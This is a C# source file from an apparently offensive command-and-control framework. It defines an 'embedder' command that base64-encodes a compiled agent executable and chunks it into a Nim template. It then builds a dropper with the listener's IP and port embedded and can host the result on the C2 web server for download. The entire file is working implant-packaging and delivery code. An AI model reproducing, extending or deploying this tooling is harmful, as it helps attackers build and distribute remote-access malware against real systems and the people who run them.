using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using Commander.Models;

namespace Commander.Commands.Laucher
{
    public class BuildEmbedderCommandCommandOptions
    {

        public string listenerName { get; set; }

        public string fileName { get; set; }

        public bool debug { get; set; }

        public bool webhost { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildEmbedderCommand : EnhancedCommand<BuildEmbedderCommandCommandOptions>
    {
        public override string Category => CommandCategory.Launcher;
        public override string Description => "Create a file embedding the agent";
        public override string Name => "embedder";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("listenerName", "name of the listener used"),
            new Option<string>(new[] { "--fileName", "-f" }, () => "embedder" ,"Nome of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildEmbedderCommandCommandOptions> context)
        {
            var listeners = context.CommModule.GetListeners();
            var listener = listeners.FirstOrDefault(l => l.Name.ToLower() == context.Options.listenerName.ToLower());

            if (listener == null)
            {
                context.Terminal.WriteLine($"No Listener named {context.Options.listenerName}");
                return false;
            }

            string protocol = "http";
            if (listener.Secured)
                protocol = "https";

            var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";

            string outFile = context.Options.fileName;
            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                outFile += ".exe";
            string outPath = Path.Combine("/tmp", outFile);




            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".exe";

            var srcDir = BuildHelper.SourceFolder;
            string agentb64 = BuildHelper.GenerateB64(Path.Combine(srcDir, fileName));

            string nimSourceCode = string.Empty;
            using (var nimReader = new StreamReader(Path.Combine(srcDir, "embedder.nim")))
            {
                nimSourceCode = nimReader.ReadToEnd();
            }

            var payload = new StringBuilder();
            foreach (var chunk in BuildHelper.SplitIntoChunks(agentb64, 150))
            {
                payload.Append("b64 = b64 & \"");
                payload.Append(chunk);
                payload.Append("\"");
                payload.Append(Environment.NewLine);
            }

            var nimFile = "tmp" + ShortGuid.NewGuid();
            nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());


            using (var writer = new StreamWriter(Path.Combine(srcDir, nimFile + ".nim")))
            {
                writer.WriteLine(nimSourceCode);
            }


            var parms = BuildHelper.ComputeNimBuildParameters(nimFile, outPath, context.Options.debug, false);

            if (context.Options.x86)
                parms.Insert(3, $"--cpu:i386");
            else
                parms.Insert(3, $"--cpu:amd64");
            parms.Insert(4, $"-d:DotNetParams={dotnetparms}");



            context.Terminal.WriteLine($"[>] Generating embedder...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);

            File.Delete(Path.Combine(srcDir, nimFile + ".nim"));

            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"Embedder can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = File.ReadAllBytes(outPath);
                context.CommModule.WebHost(listener.Id, outFile, fileContent);



                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
                context.Terminal.WriteLine($"[*] embedder hosted on : {url}");

            }

            return true;
        }
    }

}
